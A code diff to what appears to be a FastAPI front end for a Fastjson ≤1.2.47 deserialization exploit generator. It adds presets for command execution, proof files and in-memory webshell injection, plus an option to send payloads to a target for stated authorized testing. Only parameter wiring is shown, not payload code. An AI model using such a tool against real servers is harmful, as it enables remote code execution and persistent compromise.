@@ -484,8 +484,8 @@ def create_app() -> FastAPI:
         summary="Fastjson ≤1.2.47 缓存绕过证明 PoC",
         description=(
             "生成 Class 缓存绕过 payload（JdbcRowSet / BCEL+dbcp / C3P0 / MyBatis / H2）。"
-            "echo=true 时为 BCEL/H2/MyBatis 自动生成回显类；"
-            "memshell=true 时注入内存马（与 echo 互斥）。"
+            "预设字节码 preset=auto|touch|exec|echo|memshell|off；"
+            "未提供字节码时 auto 默认编译 exec 类（cmd）。"
             "默认只生成；send=true 时 POST 到 target（授权测试）。"
         ),
     )
@@ -507,6 +507,9 @@ def create_app() -> FastAPI:
             currency_field=req.currency_field,
             json_key_with_type=req.json_key_with_type,
             json_key_as_array=req.json_key_as_array,
+            preset=req.preset,  # type: ignore[arg-type]
+            proof_path=req.proof_path,
+            proof_content=req.proof_content,
             echo=req.echo,
             engine=req.engine,  # type: ignore[arg-type]
             cmd=req.cmd,
@@ -577,6 +580,8 @@ def create_app() -> FastAPI:
             socket_factory_arg=req.socket_factory_arg,
             wrap_currency=req.wrap_currency,
             currency_field=req.currency_field,
+            preset=req.preset,  # type: ignore[arg-type]
+            class_b64=req.class_b64,
             echo=req.echo,
             engine=req.engine,  # type: ignore[arg-type]
             cmd=req.cmd,
@@ -644,6 +649,8 @@ def create_app() -> FastAPI:
             classpath=req.classpath,
             wrap_currency=req.wrap_currency,
             currency_field=req.currency_field,
+            preset=req.preset,  # type: ignore[arg-type]
+            class_b64=req.class_b64,
             echo=req.echo,
             engine=req.engine,  # type: ignore[arg-type]
             cmd=req.cmd,
